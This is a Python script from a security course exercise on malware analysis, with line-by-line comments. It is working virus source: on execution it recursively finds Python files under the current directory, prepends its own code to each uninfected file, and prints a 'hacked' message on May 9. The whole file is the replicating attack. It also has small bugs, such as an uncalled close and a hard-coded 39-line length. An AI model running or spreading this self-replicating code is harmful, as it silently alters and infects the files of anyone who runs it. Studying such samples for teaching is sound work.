# Script Name:                  Ops Challenge - Python Malware Analysis
# Author:                       Gilbert Collado
# Date of latest revision:      04/11/2024
# Purpose:                      This is a virus that looks for python files in a directory and infects them
# Source1:                      https://github.com/codefellows/seattle-ops-301d12/tree/main/class-12/challenges

#!/usr/bin/python3
# The shebang line specifies the interpreter to be used to run the script.

import os
import datetime

# Constant defining the signature of the virus.
SIGNATURE = "VIRUS"

# Function to recursively locate Python files within a directory and its subdirectories.
# It returns a list of files that are not infected with the virus.
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function to infect Python files by prepending the virus code to them.
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:  # Assumes the virus code occupies the first 39 lines.
            virusstring += line
    virus.close
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# Function to detonate the virus payload if the current date is May 9th.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Locate Python files in the current directory and its subdirectories.
files_targeted = locate(os.path.abspath(""))

# Infect the located Python files.
infect(files_targeted)

# Detonate the virus payload if today's date is May 9th.
detonate()
